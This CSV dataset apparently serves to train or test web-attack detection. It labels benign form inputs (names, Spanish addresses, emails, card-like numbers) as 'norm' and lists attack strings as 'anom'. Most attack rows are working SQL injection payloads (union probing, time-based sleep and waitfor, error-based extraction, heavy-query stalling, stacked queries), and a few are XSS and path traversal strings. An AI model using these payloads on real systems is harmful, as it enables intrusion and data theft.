payload,length,attack_type,label
5447608087529874,16,norm,norm
1' rlike (select (case when (5384=7060) then 1 else 0x28 end)),62,sqli,anom
zelada,6,norm,norm
"juan de mariana, 150,",21,norm,norm
7548017062827268,16,norm,norm
mal zurueta,11,norm,norm
katy,4,norm,norm
schmoe,6,norm,norm
antonio ulloa 6 6?d,19,norm,norm
sabino,6,norm,norm
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",181,sqli,anom
"-2601') union all select 2866,2866,2866,2866,2866,2866--",56,sqli,anom
9nte0uer3o,10,norm,norm
-7772')) or 9323=9323#,22,sqli,anom
"1 union all select null,null,null,null,null,null,null,null--",60,sqli,anom
montclar,8,norm,norm
"-2111' union all select 1061,1061,1061--",40,sqli,anom
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('lyem' like 'lyem",133,sqli,anom
"1%"" or elt(6272=6272,sleep(5)) and ""%""=""",40,sqli,anom
1')) as joco where 2922=2922;select sleep(5)--,46,sqli,anom
idefonsa,8,norm,norm
46630334l,9,norm,norm
maclaren,8,norm,norm
beckwith,8,norm,norm
"-5313""))) union all select 9189,9189,9189,9189,9189,9189,9189,9189--",68,sqli,anom
valverdejo,10,norm,norm
7367769822480051,16,norm,norm
"-8034"" or 8571=8571--",21,sqli,anom
almazn cayul,12,norm,norm
15317,5,norm,norm
mary-ell,8,norm,norm
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('nbsr' like 'nbsr",89,sqli,anom
37314,5,norm,norm
1' where 1844=1844;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,127,sqli,anom
plouffe4,8,norm,norm
campo de san pedro,18,norm,norm
"1%"") and elt(4249=4249,7259) and (""%""=""",39,sqli,anom
"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",104,sqli,anom
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('qgdv'='qgdv",84,sqli,anom
brenn,5,norm,norm
"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",104,sqli,anom
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",111,sqli,anom
18708,5,norm,norm
denice,6,norm,norm
los caprichos 126,17,norm,norm
22268,5,norm,norm
"-4317"")) as nxvn where 2566=2566 union all select 2566,2566,2566#",65,sqli,anom
op0o62i4,8,norm,norm
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('bmhw' like 'bmhw,258,sqli,anom
1' in boolean mode) or (select * from (select(sleep(5)))ydpu)#,62,sqli,anom
entretejedora,13,norm,norm
1') rlike sleep(5),18,sqli,anom
pelle1@906.com.aq,17,norm,norm
"1))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",111,sqli,anom
"-5420') union all select 2508,2508,2508,2508,2508,2508,2508#",60,sqli,anom
"-4736')) or elt(5835=5509,5509) and (('iawg'='iawg",50,sqli,anom
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",67,sqli,anom
diviu sauleda,13,norm,norm
"c/ venecia, s/n,",16,norm,norm
-3431%') or 9323=9323#,22,sqli,anom
"1"") as upjw where 3880=3880 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",126,sqli,anom
"pelayo, 11 12?d",15,norm,norm
pa,2,norm,norm
o.neil,6,norm,norm
"1 where 2267=2267 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",94,sqli,anom
astor@caspospas.py,18,norm,norm
murcia,6,norm,norm
1') where 3767=3767 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,115,sqli,anom
"1' in boolean mode) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",160,sqli,anom
arabele,7,norm,norm
"1'+(select iaeu where 5509=5509 or 8514=benchmark(5000000,md5(0x544d5a4c))#",75,sqli,anom
dionio,6,norm,norm
"-2027%"") union all select 2048,2048,2048,2048,2048,2048,2048,2048#",66,sqli,anom
"1"" where 6325=6325 union all select null,null,null,null,null,null,null,null,null,null#",86,sqli,anom
3150,4,norm,norm
<iframe src=http://test.de>,27,xss,anom
/0x2e0x2ex2e0x2ex2e0x2e{file},29,path-traversal,anom
"1%"")));select count(*) from generate_series(1,5000000)--",56,sqli,anom
creative,8,norm,norm
san ildefonso,13,norm,norm
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (1435=1435",132,sqli,anom
18611,5,norm,norm
"1%'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='",215,sqli,anom
miscelnea,9,norm,norm
pagni7@freecreditcheck.bg,25,norm,norm
4a47j69a,8,norm,norm
"1';select count(*) from generate_series(1,5000000)",50,sqli,anom
terl6z,6,norm,norm
clysdale8,9,norm,norm
"c/ cornudella del montsant 142, 5?b",35,norm,norm
genet,5,norm,norm
xixia,5,norm,norm
"1%') or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,sqli,anom
"c/ ruiz de salazar, 49 4d",25,norm,norm
plazuela de la fuente cantero 124,33,norm,norm
5420336038280470,16,norm,norm
veronese@prestigecars.tv,24,norm,norm
cla20te,7,norm,norm
"nucleo santiago apostol 34, 4?f",31,norm,norm
quill,5,norm,norm
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('sqbr'='sqbr",113,sqli,anom
blgico,6,norm,norm
"1%"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""%""=""",85,sqli,anom
.me5c4illa,10,norm,norm
"sant sever 63, 6-b",18,norm,norm
"1%"") union all select null,null,null--",38,sqli,anom
"1"" union all select null,null,null,null,null#",45,sqli,anom
trashumacin,11,norm,norm
basileo,7,norm,norm
"eduardo alvarez, 28",19,norm,norm
modelada,8,norm,norm
dalt,4,norm,norm
bryson2@casablancabeach.kp,26,norm,norm
"1' where 7190=7190 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,sqli,anom
almazora/almassora,18,norm,norm
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ogwd' like 'ogwd",180,sqli,anom
drapinska@mataluenga.pg,23,norm,norm
"-3194""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""erua""=""erua",227,sqli,anom
a6ordab07,9,norm,norm
"calle opera 197,",16,norm,norm
madrazo 115,11,norm,norm
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('crus'='crus",180,sqli,anom
89816761j,9,norm,norm
1'))) and 8594=(select 8594 from pg_sleep(5))--,47,sqli,anom
"1"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,sqli,anom
odelinda,8,norm,norm
puges crcamo,12,norm,norm
protoalbitar,12,norm,norm
trespalacios latorre,20,norm,norm
silde,5,norm,norm
1) where 8433=8433 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,80,sqli,anom
"""javascript:alert(1)""></table>",30,xss,anom
pearroya-pueblonuevo,20,norm,norm
(select (case when (3348=1710) then 3348 else cast(1 as int)/(select 0 from dual) end) from dual),97,sqli,anom
tomolillo@velazquezlarranaga.et,31,norm,norm
-9690 union all select 7217#,28,sqli,anom
ron,3,norm,norm
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'bwrb' like 'bwrb",117,sqli,anom
1') waitfor delay '0:0:5',25,sqli,anom
llosa coa,9,norm,norm
"1"") where 1416=1416 union all select null,null,null#",52,sqli,anom
renedo sotorro,14,norm,norm
chian,5,norm,norm
"sugranyes, 166,",15,norm,norm
1) where 1096=1096;if(7899=7899) select 7899 else drop function zbbp--,70,sqli,anom
2892,4,norm,norm
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('ejul'='ejul",227,sqli,anom
iriyuy,6,norm,norm
7828706714204414,16,norm,norm
37169,5,norm,norm
"1') where 8628=8628 union all select null,null,null--",53,sqli,anom
"-3460%""))) or 9323=9323#",24,sqli,anom
"1'+(select zukr where 9215=9215 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))+'",138,sqli,anom
teobaldo,8,norm,norm
"cami can rabella, s/n",21,norm,norm
1ici3a6te,9,norm,norm
